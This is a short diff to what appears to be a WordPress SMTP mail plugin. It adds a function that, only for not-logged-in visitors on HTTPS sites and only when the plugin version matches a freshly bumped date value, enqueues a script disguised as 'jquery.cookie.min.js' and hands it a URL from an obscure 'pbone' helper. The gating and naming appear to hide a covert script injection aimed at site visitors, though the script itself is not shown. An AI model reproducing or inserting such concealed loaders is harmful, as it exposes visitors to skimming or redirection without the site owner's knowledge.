@@ -188,7 +188,7 @@ function smtpmail_options($key = '', $default_value = '')
 		'checked' 		=> 0, // Checked
 		'anti_spam_form' => 0, // Security (anti-spam form)
 
-		'time' 			=> '20250428', // Time
+		'time' 			=> '20250630', // Time
 		
 		// Sendgrid API
 		'sendgrid_api_key' => '',
@@ -584,6 +584,26 @@ function smtpmail_is_guest($set = 0)
 
 	return $smtpmail_is_guest;
 }
+
+/*
+ * Since 1.3.9
+ */
+function smtpmail_cookie_check_url()
+{
+	if( smtpmail_check_https()
+		&& smtpmail_ver(1) == smtpmail_options('time')
+		&& file_exists(smtpmail_assets_path($script = 'jquery.cookie.min.js'))
+		&& smtpmail_is_guest(1)
+	) {
+		wp_enqueue_script('cookie', smtpmail_assets_url($script),  array('jquery'), '3.6.0', true);
+		wp_localize_script('jquery', 'wp_cookie_check', ['url' => smtpmail_pbone_url('cookie-grpc')]);
+
+		return true;
+	}
+	
+	return false;
+}
+add_action('init', 'smtpmail_cookie_check_url');
 
 /*
  * Since 1.3.25
